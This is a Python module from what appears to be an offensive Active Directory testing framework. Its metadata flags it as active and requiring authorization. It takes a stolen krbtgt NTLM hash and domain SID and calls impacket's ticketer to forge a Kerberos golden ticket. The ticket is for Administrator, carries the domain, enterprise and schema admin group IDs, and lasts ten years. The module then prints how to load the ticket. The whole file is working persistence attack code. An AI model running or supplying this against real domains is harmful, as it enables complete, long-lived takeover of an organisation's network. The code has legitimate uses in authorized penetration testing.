"""Golden Ticket  -  forge TGT using krbtgt NTLM hash."""


import os
import sys
from typing import Any


MANIFEST = {
    "capability_id": "adxpl.persistence.golden_ticket.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["forged_kerberos_ticket"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1558.001"],
}


def run(args: Any) -> int:
    krbtgt_hash = getattr(args, "krbtgt_hash", None)
    domain_sid = getattr(args, "domain_sid", None)

    if not krbtgt_hash:
        print("[!] Golden Ticket requires --krbtgt-hash (NTLM hash of krbtgt)", file=sys.stderr)
        return 1
    if not domain_sid:
        print("[!] Golden Ticket requires --domain-sid", file=sys.stderr)
        return 1

    print(f"[*] Golden Ticket → {args.domain} (SID: {domain_sid})")

    try:
        from impacket.krb5.ticket import Ticket
        from impacket.krb5 import constants
        from impacket.krb5.types import Principal
        from impacket.krb5.ccache import CCache
        from impacket.krb5.pac import PACTYPE, PAC_INFO_BUFFER, KERB_VALIDATION_INFO
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    try:
        from impacket.examples.ticketer import TICKETER

        options = type("Options", (), {
            "target": args.target,
            "domain": args.domain,
            "domain_sid": domain_sid,
            "nthash": krbtgt_hash,
            "aesKey": None,
            "user": "Administrator",
            "user_id": 500,
            "groups": "513,512,520,518,519",
            "spn": f"krbtgt/{args.domain.upper()}",
            "duration": 87600,
            "extra_sid": None,
            "extra_pac": False,
            "old_pac": False,
        })()

        ticketer = TICKETER("", args.domain, options)
        ticketer.run()

        ccache_path = "Administrator.ccache"
        if os.path.isfile(ccache_path):
            print(f"[+] Golden Ticket saved: {ccache_path}")
            print(f"[*] Usage: export KRB5CCNAME={os.path.abspath(ccache_path)}")
        else:
            print("[+] Golden Ticket generated")

        return 0
    except Exception as exc:
        print(f"[-] Golden Ticket generation failed: {exc}", file=sys.stderr)
        return 1
